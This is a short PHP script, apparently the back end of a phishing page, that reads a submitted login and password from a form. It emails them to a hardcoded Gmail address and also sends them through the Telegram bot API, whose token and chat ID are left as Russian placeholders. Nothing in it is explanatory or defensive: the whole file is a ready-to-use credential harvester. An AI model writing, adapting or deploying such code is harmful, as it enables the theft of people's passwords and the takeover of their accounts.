<?php

$yourEmail = "zinetic.sinetic@gmail.com";

$login = $_POST['login'];
$pas = $_POST['password'];
$message = "Login: $login \n\nPassword: $pas";


    $res = mail($yourEmail, $message, "Content-type: text/plain; charset=\"utf-8\"\n From: $recepient");
    
    function telegram($text){
    file_get_contents("https://api.telegram.org/botВашТокен/sendMessage?chat_id=ВашID&text=".urlencode($text));
    }

    telegram("Login: $login \n\nPassword: $pas");

?>